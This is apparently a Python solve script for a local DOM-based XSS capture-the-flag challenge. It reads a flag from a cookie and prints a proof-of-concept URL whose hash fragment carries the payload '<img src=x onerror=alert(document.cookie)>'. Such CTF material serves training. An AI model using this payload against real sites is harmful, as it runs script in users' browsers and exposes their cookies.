#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
08-xss-dom solve script

功能：
1. 请求目标首页
2. 从 Set-Cookie 中提取 MEMO_KEY
3. URL 解码得到 TOGOGO-flag{...}
4. 检查 DOM XSS 关键代码特征
5. 输出浏览器手工复现 URL
"""

import re
import sys
from urllib.parse import unquote, quote

import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1


TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:33330/")


def get_flag(target: str) -> str | None:
    resp = requests.get(target, timeout=10)
    print(f"[+] GET {target} -> HTTP {resp.status_code}")

    set_cookie = resp.headers.get("Set-Cookie", "")
    print(f"[+] Set-Cookie: {set_cookie}")

    # 题目把 flag 放在 MEMO_KEY cookie 中，值是 URL 编码形式
    m = re.search(r"MEMO_KEY=([^;]+)", set_cookie)
    if not m:
        print("[-] 未在 Set-Cookie 中找到 MEMO_KEY")
        return None

    encoded_value = m.group(1)
    decoded_value = unquote(encoded_value)
    print(f"[+] MEMO_KEY decoded: {decoded_value}")

    # 顺手检查 DOM XSS 关键链路：location.hash -> innerHTML
    html = resp.text
    if "location.hash" in html and "innerHTML" in html and "URLSearchParams" in html:
        print("[+] 发现 DOM XSS 特征：location.hash / URLSearchParams / innerHTML")
    else:
        print("[!] 未完整匹配 DOM XSS 特征，请手工检查源码")

    # 输出浏览器复现 payload：用 XSS 弹出 document.cookie
    payload = "<img src=x onerror=alert(document.cookie)>"
    poc_url = target.rstrip("/") + "/#memo=" + quote(payload, safe="")
    print("[+] Browser PoC URL:")
    print("    " + poc_url)

    flag_match = re.search(r"TOGOGO-flag\{[^}]+\}", decoded_value)
    if flag_match:
        return flag_match.group(0)
    return decoded_value


def main() -> int:
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    flag = get_flag(target)
    if flag:
        print(f"\n[FLAG] {flag}")
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
